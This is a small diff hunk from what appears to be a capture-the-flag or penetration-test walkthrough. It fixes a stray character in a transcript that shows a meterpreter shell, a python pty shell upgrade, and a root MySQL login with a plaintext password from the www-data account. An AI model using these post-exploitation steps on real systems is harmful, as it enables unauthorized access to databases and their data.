@@ -510,7 +510,7 @@ MySQL connection
 meterpreter> shell
 python3 -c 'import pty;pty.spawn("/bin/bash")'
 
-www-data@ck00:/home/ck$ mysql -u root -h localhost -p ^?
+www-data@ck00:/home/ck$ mysql -u root -h localhost -p
 Enter password: bla_is_my_password
 
 Welcome to the MySQL monitor.  Commands end with ; or \g.
